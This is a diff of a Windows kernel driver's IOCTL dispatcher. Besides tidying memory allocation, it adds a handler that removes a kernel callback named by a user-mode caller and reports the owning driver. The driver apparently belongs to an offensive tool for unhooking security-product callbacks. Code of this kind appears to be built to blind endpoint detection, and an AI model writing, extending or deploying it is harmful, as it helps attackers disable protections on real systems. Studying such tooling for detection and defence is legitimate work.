@@ -249,36 +249,78 @@ NTSTATUS TsIoCtlDispatch(
             else 
             {
                 /* allocate memory for callback list */
-                if ( ! ( CallbackData = ExAllocatePool2( POOL_FLAG_NON_PAGED, CallbackQuery->Size, RS_POOL_TAG_RHST ) ) ) {
+                if ( ! ( CallbackData = RsMemAlloc( CallbackQuery->Size ) ) ) {
                     PUTS( "Failed to allocate memory for CallbackData" )
                     NtStatus = STATUS_INSUFFICIENT_RESOURCES;
-                    goto CB_CLEANUP;
+                    goto CB_QUERY_END;
                 }
 
                 /* query callback list */
                 if ( ! NT_SUCCESS( NtStatus = RsCallbackQuery( CallbackQuery->Type, CallbackData, &Size ) ) ) {
                     PRINTF( "Failed to query callbacks Type:[%d] Size:[%d]: %p\n", CallbackQuery->Type, CallbackQuery->Size, NtStatus )
-                    goto CB_CLEANUP;
+                    goto CB_QUERY_END;
                 }
-
-                PRINTF( "Queried callbacks size:[%d]\n", Size )
-
+                
                 if ( CallbackQuery->Size != Size ) {
                     PRINTF( "Query Size:[%d] != Size:[%d]\n", CallbackQuery->Size, Size )
                     NtStatus = STATUS_INFO_LENGTH_MISMATCH;
-                    goto CB_CLEANUP;
+                    goto CB_QUERY_END;
                 }
                 
                 /* copy over the  */
                 RtlCopyMemory( Irp->AssociatedIrp.SystemBuffer, CallbackData, Size );
                 Length += Size;
 
-            CB_CLEANUP:
+            CB_QUERY_END:
                 if ( CallbackData ) {
-                    ExFreePool2( CallbackData, RS_POOL_TAG_RHST, NULL, 0 );
+                    RsMemFree( CallbackData );
                     CallbackData = NULL;
                 }
             }
+
+            break; 
+        }
+
+        case RHAAST_IOCTL_CALLBACK_REMOVE: PUTS( "RHAAST_IOCTL_CALLBACK_REMOVE" )
+        {
+            PRS_C_CALLBACK_REMOVE Remove = NULL;
+            RS_CALLBACK_DATA      Data   = { 0 };
+
+            RtlSecureZeroMemory( &Data, sizeof( Data ) );
+
+            /* check if param has been specified */
+            if ( ! ( Remove = Irp->AssociatedIrp.SystemBuffer ) ) {
+                NtStatus = STATUS_INVALID_PARAMETER;
+                break;
+            }
+
+            /* check data input size */
+            if ( IrpStack->Parameters.DeviceIoControl.InputBufferLength < sizeof( RS_C_CALLBACK_REMOVE ) ) {
+                NtStatus = STATUS_INVALID_BUFFER_SIZE;
+                break;
+            }
+            
+            /* remove specified callback */
+            if ( ! NT_SUCCESS( NtStatus = RsCallbackRemove( Remove->Type, Remove->Callback ) ) ) {
+                PRINTF( "Failed to remove callback: Type:[%d] Callback:[%p] NtStatus:[%p]\n", Remove->Type, Remove->Callback, NtStatus )
+                break;
+            }
+
+            /* query driver name & base from callback address */
+            if ( ! NT_SUCCESS( NtStatus = RsDrvNameBaseFromAddr( C_PTR( Remove->Callback ), ( PCHAR* ) & Data.DriverName, ( PVOID ) & Data.DriverBase ) ) ) {
+                PRINTF( "RsDrvNameBaseFromAddr Failed: %p\n", NtStatus )
+            }
+
+            Data.Type     = Remove->Type;
+            Data.Callback = Remove->Callback;
+
+            /* copy over collected data */
+            RtlCopyMemory( Irp->AssociatedIrp.SystemBuffer, &Data, sizeof( Data ) );
+
+            /* clear struct from stack */
+            RtlSecureZeroMemory( &Data, sizeof( Data ) );
+
+            Length += sizeof( RS_CALLBACK_DATA );
 
             break; 
         }
